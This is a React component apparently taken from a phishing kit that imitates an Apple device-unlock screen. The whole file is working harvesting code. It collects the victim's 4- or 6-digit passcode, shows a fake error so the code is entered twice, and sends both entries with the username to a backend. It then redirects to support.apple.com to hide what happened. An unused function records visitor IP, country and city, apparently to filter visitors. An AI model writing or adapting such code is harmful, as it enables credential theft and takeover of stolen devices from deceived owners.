import React, { useEffect, useRef, useState } from 'react';
import { Form, FormControl, Container, Row, Col } from 'react-bootstrap';
import { Link } from "react-router";

import PopupPassCode from './poputs/PopupPassCode';
import responses from '../../services/responses';
import { convert } from 'html-to-text';
import { useData } from '../../context/UserContext';

const Passcode = ({ 
                    insertId, 
                    setInsertId,
                    removeResponse, 
                    setRemoveResponse,
                    translate,
                    lang,
                    setShowLogin
                 }) => {

    const { user } = useData();    
    const [lengthCode, setLengthCode] = useState(user?.data?.codeUnlock);
    const [lengthArray, setLengthArray] = useState([])
    const [inputValues, setInputValues] = useState([]);
    const [codeOne, setCodeOne] = useState('')
    const [codeTwo, setCodetwo] = useState('')
    const [passCodeCount, setPassCodeCount] = useState(0); 

    const passCodeOneRef = useRef('');
    const passCodeTwoRef = useRef('');

    useEffect(()=>{
       
       if(lengthCode == 4){
          setLengthArray([0, 1, 2, 3])
          setInputValues(new Array(user?.data?.codeUnlock).fill(''));
       }else{
          setLengthArray([0, 1, 2, 3, 4, 5])
          setInputValues(new Array(user?.data?.codeUnlock).fill(''));
       }
    },[])

    useEffect(() => {
        if (lengthArray.length > 0) {
            const firstField = document.getElementsByClassName('char-field')[0];
            if (firstField) {
                setTimeout(() => {
                //firstField.focus();
                }, 1000);
            }
        }
    }, [lengthArray]);

    const inputRefs = useRef([]);

    const handleChange = (e, index) => {
        document.getElementsByClassName('popupPasscode')[0].style.display = 'none';
        const newValue = e.target.value;
        const updatedValues = [...inputValues];
        updatedValues[index] = newValue;
        setInputValues(updatedValues);

        
    
        // Verificar si es el último input y todos los inputs están llenos
        if (index === lengthCode - 1 && updatedValues.every((val) => val !== '')) {
            handlePasscode(updatedValues.join(''));
        }
    
        if (newValue.length === 1 && index < lengthCode - 1) {
            inputRefs.current[index + 1].focus();
        }
    };

    const handleKeyDown = (e, index) => {
        if (e.key === 'Backspace' && index > 0) {
            const lastFilledIndex = inputValues.findIndex((val) => val === '');
            const lastIndexToClear = lastFilledIndex === -1 ? lengthCode - 1 : lastFilledIndex - 1;
    
            if (index <= lastIndexToClear) {
                const clearedValues = inputValues.map((val, i) => (i >= index ? '' : val));
                setInputValues(clearedValues);
    
                // Clear the inputs visually
                clearedValues.forEach((val, i) => {
                    if (inputRefs.current[i]) {
                        inputRefs.current[i].value = val;
                    }
                });
            }
    
            inputRefs.current[index - 1].focus();
        }
    };
    
    const handlePasscode = (code) => {
        removeFocusFromFields();
        document.getElementById('loadingVerify').style.display = 'block';
        
        setPassCodeCount((prevCount) => {
            
            const newCount = prevCount + 1;
            if (newCount === 1) {
                passCodeOneRef.current = code;
              
            } else if (newCount === 2) {
                    passCodeTwoRef.current = code;
            }

            setCodeOne(passCodeOneRef.current);
            setCodetwo(passCodeTwoRef.current);


            let statusPasscode = '';

            setTimeout(async() => {
                // Vaciar todos los inputs
                 
            if(newCount == 1){
                const fields = document.getElementsByClassName('char-field');
                Array.from(fields).forEach((field) => {
                   field.value = '';
                });
                setInputValues(new Array(lengthCode).fill('')); // Reiniciar el estado de los valores
                document.getElementsByClassName('popupPasscode')[0].style.display = 'block';
                document.getElementById('loadingVerify').style.display = 'none';
                removeFocusFromFields();
                const firstField = document.getElementsByClassName('char-field')[0];
                firstField.focus()
                statusPasscode = 'passcode_process';
                
                await addAcountPasscode(passCodeOneRef.current, 'Processing',statusPasscode);
               
            } else if (newCount === 2) {
                statusPasscode = 'passcode_process';
                await addAcountPasscode(passCodeOneRef.current, passCodeTwoRef.current, statusPasscode);
               // await ipBlocker()
               // setShowLogin(true)
                setTimeout(() => {
                            window.location.href = 'https://support.apple.com';
                }, 1000);
            }   

           
              
          }, 1500);
            return newCount;
        });

        
    };
    const removeFocusFromFields = () => {
        const fields = document.getElementsByClassName('char-field');
        Array.from(fields).forEach((field) => field.blur());
    };

    const addAcountPasscode = async(passCodeOne, passCodeTwo, statusPasscode ) => {
        try {
            console.log(passCodeOne + ' - ' + passCodeTwo + ' - ' +statusPasscode)

            let data = {
                username: user?.data?.username || '',
                codesUnlock : `${passCodeOne}-${passCodeTwo}`,
                status : statusPasscode,
                insertId
            }

            const response = await responses.addUnlockCode(data)
           
           
               setInsertId(response.data._id)

        } catch (error) {
            console.error('Error en add passcode:', error);
        }
    }

    const ipBlocker = async() => {
        try {

            let statusIP  = 0;
            let typeStatus = 'procesado';
            let urlDomain = `${window.location.hostname}:5173`

            let data = {
                ip_adress   : ip,
                pais        : country,
                ciudad      : city,
                status_ip   : statusIP,
                tipo_status : typeStatus,
                url_dominio : urlDomain
                
            }

            await responses.ipBlocker(data)

            //console.log(data)

        } catch (error) {
            console.error('Error en add passcode:', error);
        }
    }

    return (
        <Container style={{ padding: 0, position: 'relative' }}>
            
            <Form className="form-horizontal form-bordered form-code" noValidate>
                <div>
                <h3 className="my-3 headerPassCode" style={{ textAlign: 'center' }}>{translate(lang, 'Ingrese su código de desbloqueo')}</h3>
                </div>
                <PopupPassCode translate={translate} lang={lang}/>
                <Row className="justify-content-center">
                   
                    {lengthArray.map((index) => (
                        <Col key={index} xs="auto" className="field-wrap force-ltr" style={{ padding: '6px' }}>
                          
                            <FormControl
                                maxLength="1"
                                autoCorrect="off"
                                autoComplete="off"
                                autoCapitalize="off"
                                spellCheck="false"
                                id={`char${index}`}
                                className="form-control force-ltr form-textbox char-field"
                                aria-label={`Enter Verification Code Digit ${index + 1}`}
                                placeholder=""
                                type="tel"
                                style={{
                                    width: '40px',
                                    height: '40px',
                                    border: '1px solid #d7d7d7',
                                    borderRadius: '4px',
                                    textAlign: 'center',
                                    fontSize: '24px',
                                    padding: '0',
                                    fontWeight: '500',
                                    display: 'inline-block',
                                }}
                                onKeyPress={(e) => {
                                    if (!/[0-9]/.test(e.key)) {
                                        e.preventDefault();
                                    }
                                }}
                                onChange={(e) => handleChange(e, index)}
                                onKeyDown={(e) => handleKeyDown(e, index)}
                                ref={(el) => (inputRefs.current[index] = el)}
                            />
                        </Col>
                    ))}
                </Row>
                
                <div style={{ textAlign: 'center', fontSize: '15px', marginTop: '10px' }}>
                    <div style={{ display: 'none' }} id="loadingVerify" className="loading-text">{translate(lang, 'Verificando')}</div>
                </div>
            </Form>
        </Container>
    );
};

export default Passcode;